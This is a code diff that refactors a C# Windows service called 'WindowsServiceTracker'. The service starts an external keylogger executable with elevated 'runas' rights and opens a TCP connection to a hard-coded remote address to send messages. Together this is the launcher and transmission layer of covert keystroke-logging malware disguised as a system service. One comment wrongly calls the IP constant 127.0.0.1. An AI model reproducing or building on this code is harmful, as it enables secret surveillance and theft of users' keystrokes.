@@ -25,16 +25,16 @@ namespace WindowsServiceTracker
         //127.0.0.1 = 0x0100007F because of network byte order
         private const long IP_ADDRESS = 0x2E3811AC; //127.0.0.1 as placeholder
         private const int PORT = 10000;
-        private const string errorLogName = "TrackerErrorLog";
-        private const string errorLogMachine = "TrackerComputer";
-        private const string errorLogSource = "WindowsServiceTracker";
-        private const string externProc = "..\\..\\..\\WTKL\\bin\\Debug\\WTKL.exe";
+        private const string ERROR_LOG_NAME = "TrackerErrorLog";
+        private const string ERROR_LOG_MACHINE = "TrackerComputer";
+        private const string ERROR_LOG_SOURCE = "WindowsServiceTracker";
+        private const string EXTERNAL_PROCESS = "..\\..\\..\\WTKL\\bin\\Debug\\WTKL.exe";
+
         private Process keyLogger = null;
         private ProcessStartInfo keyLoggerStartInfo;
-
-        private IPEndPoint IPPort = new IPEndPoint(IP_ADDRESS, PORT);
+        private IPEndPoint ipPort = new IPEndPoint(IP_ADDRESS, PORT);
         private TcpClient tcp;
-        NetworkStream tcpStream;
+        private NetworkStream tcpStream;
 
         //private Keylogger keylog = new Keylogger();
 
@@ -42,9 +42,9 @@ namespace WindowsServiceTracker
         {
             InitializeComponent();
             //Creates the error log source if it doesn't already exist
-            if(!EventLog.SourceExists(errorLogSource))
+            if (!EventLog.SourceExists(ERROR_LOG_SOURCE))
             {
-                EventLog.CreateEventSource(errorLogSource, errorLogName);
+                EventLog.CreateEventSource(ERROR_LOG_SOURCE, ERROR_LOG_NAME);
             }
         }
 
@@ -62,13 +62,7 @@ namespace WindowsServiceTracker
             //than some Windows folder that I couldn't seem to locate
             System.IO.Directory.SetCurrentDirectory(System.AppDomain.CurrentDomain.BaseDirectory);
 
-            //Write to the Windows Event Logs, shows up under Windows Logs --> Application
-            EventLog.WriteEntry(errorLogSource, "Test event", EventLogEntryType.Information);
-
-            startKeyLogger();
-            
-            //SendStringMsg(Environment.MachineName);
-            
+            StartKeyLogger();
         }
 
         protected override void OnStop()
@@ -76,12 +70,18 @@ namespace WindowsServiceTracker
             //Keylogger.Stop();
             SendStringMsg("Bye!");
 
-            stopKeyLogger();
+            StopKeyLogger();
 
             Disconnect();
         }
 
-        private bool startKeyLogger() //todo exception handling
+        private void WriteEventLogEntry(string eventLogInput)
+        {
+            //Write to the Windows Event Logs, shows up under Windows Logs --> Application
+            EventLog.WriteEntry(ERROR_LOG_SOURCE, eventLogInput, EventLogEntryType.Information);
+        }
+
+        private bool StartKeyLogger() //todo exception handling
         {
             if (keyLogger != null && keyLogger.Responding)
             {
@@ -92,7 +92,7 @@ namespace WindowsServiceTracker
             keyLoggerStartInfo = new ProcessStartInfo();
 
             //File name here MUST MATCH the file name of the external process you've created
-            keyLoggerStartInfo.FileName = externProc;
+            keyLoggerStartInfo.FileName = EXTERNAL_PROCESS;
             //Verb = "runas" and UseShellExecute = true must be set for admin rights (I think)
             keyLoggerStartInfo.Verb = "runas";
             keyLoggerStartInfo.WindowStyle = ProcessWindowStyle.Normal;
@@ -103,7 +103,7 @@ namespace WindowsServiceTracker
             return true;
         }
 
-        private bool stopKeyLogger() //todo exception handling
+        private bool StopKeyLogger() //todo exception handling
         {
             if (keyLogger != null)
             {
@@ -117,14 +117,14 @@ namespace WindowsServiceTracker
             try
             {
                 tcp = new TcpClient();
-                tcp.Connect(IPPort);
+                tcp.Connect(ipPort);
                 return true;
             }
             catch (Exception)
             {
                 //Another write to the Windows Event Logs, shows up in the same place as before but as type "Error" instead of type "Information"
                 string error = "Service failed to connect to IP address " + IP_ADDRESS + " on port " + PORT;
-                EventLog.WriteEntry(errorLogSource, error, EventLogEntryType.Error);
+                EventLog.WriteEntry(ERROR_LOG_SOURCE, error, EventLogEntryType.Error);
             }
             return false;
         }
@@ -135,12 +135,12 @@ namespace WindowsServiceTracker
             {
                 tcpStream.Close();
             }
-            catch(NullReferenceException)
+            catch (NullReferenceException)
             { }
             return true;
         }
 
-        private Boolean SendStringMsg(String stringMsg)
+        private bool SendStringMsg(String stringMsg)
         {
             if (tcp != null && (tcpStream == null || !tcpStream.CanWrite))
             {
@@ -149,7 +149,7 @@ namespace WindowsServiceTracker
                     tcpStream = tcp.GetStream();
                 }
                 catch (InvalidOperationException)
-                {}
+                { }
             }
 
             if (tcpStream != null && tcpStream.CanWrite)
